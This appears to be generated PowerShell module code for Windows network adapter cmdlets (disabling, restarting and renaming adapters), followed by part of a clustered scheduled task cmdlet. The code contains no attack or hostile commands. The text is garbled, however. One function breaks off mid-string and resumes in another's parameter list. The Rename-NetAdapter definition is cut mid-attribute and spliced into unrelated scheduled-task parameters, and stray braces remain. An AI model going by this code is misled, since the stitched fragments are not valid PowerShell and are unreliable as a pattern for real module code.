[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv4')) {
      [object]$__cmdletization_value = ${IPv4}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv6')) {
      [object]$__cmdletization_value = ${IPv6}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NoRestart')) {
      [object]$__cmdletization_value = ${NoRestart}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('PassThru')) {
      [object]$__cmdletization_value = ${PassThru}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
')]
[switch]
${PassThru},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('PassThru')) {
      [object]$__cmdletization_value = ${PassThru}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Disable', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $false
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Disable-NetAdapter' -Alias '*'
  

function Restart-NetAdapter
{
[CmdletBinding(DefaultParameterSetName='ByName', SupportsShouldProcess=$true, 
ConfirmImpact='Medium', PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
param(

[Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
[Alias('ifAlias','InterfaceAlias')]
[ValidateNotNull()]
[string[]]
${Name},

[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifDesc')]
[ValidateNotNull()]
[string[]]
${InterfaceDescription},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[switch]
${IncludeHidden},

[Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, 
ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAdapter')]
[ValidateNotNull()]
[ciminstance[]]
${InputObject},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${PassThru},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('PassThru')) {
      [object]$__cmdletization_value = ${PassThru}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Restart', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $false
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Restart-NetAdapter' -Alias '*'
  

function Rename-NetAdapter
{
[CmdletBinding(DefaultParameterSetName='ByName', SupportsShouldProcess=$true, 
ConfirmImpact='Medium', PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
param(

[Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
[Alias('ifAlias','InterfaceAlias')]
[ValidateNotNull()]
[string[]]
${Name},

[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifDesc')]
[ValidateNotNull()]
[string[]]
${InterfaceDescription},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[switch]
${IncludeHidden},

[Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, 
ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAdapter')]
[ValidateNotNull()]
[ciminstance[]]
${InputObject},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${PassThru},

[Parameter(ParameterSetName='ByName', Mandatory=$true, Position=1)]
[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, Position=1)]
[Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, Position=1)]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[string]
${NewName},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetNa
[OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'
)][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.M
anagement.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')][OutputType([Microsoft
.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure
.CimInstance#MSFT_ClusteredScheduledTask')]
param(

[Parameter(ParameterSetName='Object', Mandatory=$true, Position=0)]
[Parameter(ParameterSetName='Params', Mandatory=$true, Position=0)]
[Parameter(ParameterSetName='Xml', Mandatory=$true, Position=0)]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[string]
${TaskName},

[Parameter(ParameterSetName='Object', Position=2)]
[Parameter(ParameterSetName='Params', Position=5)]
[Parameter(ParameterSetName='Xml', Position=2)]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[string]
${Cluster},

[Parameter(ParameterSetName='Object', Mandatory=$true, Position=1, 
ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[ciminstance]
${InputObject},

[Parameter(ParameterSetName='Params', Position=1)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[ciminstance[]]
${Action},

[Parameter(ParameterSetName='Params', Position=3)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[ciminstance]
${Settings},

[Parameter(ParameterSetName='Params', Position=2)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[ciminstance[]]
${Trigger},

[Parameter(ParameterSetName='Params', Position=4)]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[string]
${Description},

[Parameter(ParameterSetName='Xml', Mandatory=$true, Position=1, 
ValueFromPipeline=$true)]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[string]
${Xml},

[Parameter(ParameterSetName='Object')]
[Parameter(ParameterSetName='Params')]
[Parameter(ParameterSetName='Xml')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='Object')]
[Parameter(ParameterSetName='Params')]
[Parameter(ParameterSetName='Xml')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='Object')]
[Parameter(ParameterSetName='Params')]
[Parameter(ParameterSetName='Xml')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.Powe
rShell.Cmdletization.MethodParameter]]::new()

switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('Object') -contains $_ } {
  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('TaskName')) {
    [object]$__cmdletization_value = ${TaskName}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Cluster')) {
    [object]$__cmdletization_value = ${Cluster}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('InputObject')) {
    [object]$__cmdletization_value = ${InputObject}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; 
Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameter.ParameterTypeName = 
'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
  $__cmdletization_methodParameter.ParameterTypeName = 
'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; 
ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = 
$false }
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByObject', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)

$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)
  }
  { @('Params') -contains $_ } {
  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Action')) {
    [object]$__cmdletization_value = ${Action}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 
'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 
'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameter.ParameterTypeName = 
'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Settings')) {
    [object]$__cmdletization_value = ${Settings}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 
'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 
'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameter.ParameterTypeName = 
'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Cluster')) {
    [object]$__cmdletization_value = ${Cluster}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('TaskName')) {
    [object]$__cmdletization_value = ${TaskName}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Trigger')) {
    [object]$__cmdletization_value = ${Trigger}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 
'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 
'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameter.ParameterTypeName = 
